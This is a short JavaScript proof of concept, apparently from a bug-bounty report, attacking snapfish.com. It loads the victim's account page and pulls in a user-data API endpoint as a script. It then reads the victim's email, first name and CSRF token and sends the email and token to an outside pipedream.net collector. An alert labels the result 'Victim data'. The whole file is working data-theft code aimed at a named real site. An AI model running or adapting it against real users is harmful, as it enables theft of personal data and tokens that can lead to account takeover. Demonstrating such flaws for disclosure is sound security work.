(() => {
  store = {};

  const img = document.createElement("img");
  img.src = "https://www.snapfish.com/youraccount";
  img.style.display = "none";
  document.body.appendChild(img);

  img.onload = img.onerror = () => {
    const script = document.createElement("script");
    script.src = "https://www.snapfish.com/photo-gift/api/v1/user-data";
    script.onload = () => {
      const email = store.emailAddress || "";
      const csrf = store.securityCSRFToken || "";
      const firstName = store.firstName || "";
      const enc = (s) => encodeURIComponent(s);

      new Image().src = `https://eo1ey5201bcmppg.m.pipedream.net?email=${enc(email)}&csrf=${enc(csrf)}`;

      alert(
        "______________________________________\n" +
        "Victim data:\n\n" +
        `First name -> ${firstName}\n` +
        `Email -> ${email}\n` +
        `CsrfToken -> ${csrf}\n\n` +
        "Both sent to @m4rc10sz\n" +
        "______________________________________"
      );
    };
    document.head.appendChild(script);
  };
})();
